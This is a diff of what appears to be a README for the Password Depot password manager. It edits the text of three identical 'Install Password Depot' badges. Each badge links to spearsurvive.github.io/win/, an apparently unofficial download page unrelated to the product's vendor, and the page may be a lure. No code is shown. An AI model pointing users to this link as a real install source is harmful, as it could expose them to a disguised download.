@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Password Depot](https://img.shields.io/badge/⬇_Install_Password%20Depot-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Password Depot](https://img.shields.io/badge/⬇_Install_Password+Depot-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Password Depot is a comprehensive Windows password manager with enterprise and p
 
 <div align="center">
 
-[![⬇ Install Password Depot](https://img.shields.io/badge/⬇_Install_Password%20Depot-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Password Depot](https://img.shields.io/badge/⬇_Install_Password+Depot-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Password Depot is a comprehensive Windows password manager with enterprise and p
 
 <div align="center">
 
-[![⬇ Install Password Depot](https://img.shields.io/badge/⬇_Install_Password%20Depot-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Password Depot](https://img.shields.io/badge/⬇_Install_Password+Depot-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
